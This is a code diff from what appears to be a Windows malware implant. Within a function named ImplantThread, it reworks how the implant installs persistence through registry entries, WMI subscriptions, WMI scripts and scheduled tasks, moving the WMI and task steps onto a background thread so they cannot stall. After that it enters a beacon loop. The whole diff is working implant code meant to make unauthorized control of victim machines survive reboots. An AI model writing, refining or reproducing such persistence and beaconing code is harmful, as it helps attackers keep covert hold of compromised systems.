@@ -98,28 +98,25 @@ DWORD WINAPI ImplantThread(LPVOID) {
     DBG("persistence: registry start");
     try { InstallRegistryPersistence(exePath); } catch(...) { DBG("registry EXCEPTION"); }
     DBG("persistence: registry done");
-    DBG("persistence: WMI check start");
-    bool wmiInstalled = false;
-    try { wmiInstalled = !!IsWmiPersistenceInstalled(); } catch(...) { DBG("WMI check EXCEPTION"); }
-    DBG("persistence: WMI installed=%d", (int)wmiInstalled);
-    if (!wmiInstalled) {
-        DBG("persistence: InstallWmiPersistence start");
-        try { InstallWmiPersistence(exePath); } catch(...) { DBG("InstallWmiPersistence EXCEPTION"); }
-        DBG("persistence: InstallWmiPersistence done");
-        DBG("persistence: InstallWmiScriptPersistence start");
-        try { InstallWmiScriptPersistence(exePath); } catch(...) { DBG("InstallWmiScriptPersistence EXCEPTION"); }
-        DBG("persistence: InstallWmiScriptPersistence done");
-    }
-    DBG("persistence: schtask check start");
-    bool taskInstalled = false;
-    try { taskInstalled = !!IsScheduledTaskInstalled(); } catch(...) { DBG("schtask check EXCEPTION"); }
-    DBG("persistence: schtask installed=%d", (int)taskInstalled);
-    if (!taskInstalled) {
-        DBG("persistence: InstallScheduledTaskPersistence start");
-        try { InstallScheduledTaskPersistence(exePath); } catch(...) { DBG("InstallScheduledTaskPersistence EXCEPTION"); }
-        DBG("persistence: InstallScheduledTaskPersistence done");
-    }
-    DBG("persistence done");
+
+    // WMI + schtask run async — ConnectServer can hang indefinitely on busy WMI
+    struct PersistCtx { wchar_t path[MAX_PATH]; };
+    auto* ctx = new PersistCtx{};
+    wcscpy_s(ctx->path, exePath);
+    CreateThread(nullptr, 0, [](LPVOID p) -> DWORD {
+        auto* c = static_cast<PersistCtx*>(p);
+        __try {
+            if (!IsWmiPersistenceInstalled()) {
+                InstallWmiPersistence(c->path);
+                InstallWmiScriptPersistence(c->path);
+            }
+            if (!IsScheduledTaskInstalled())
+                InstallScheduledTaskPersistence(c->path);
+        } __except(EXCEPTION_EXECUTE_HANDLER) {}
+        delete c;
+        return 0;
+    }, ctx, 0, nullptr);
+    DBG("persistence done (WMI/schtask async)");
 
     DBG("BeaconLoop start");
     try {
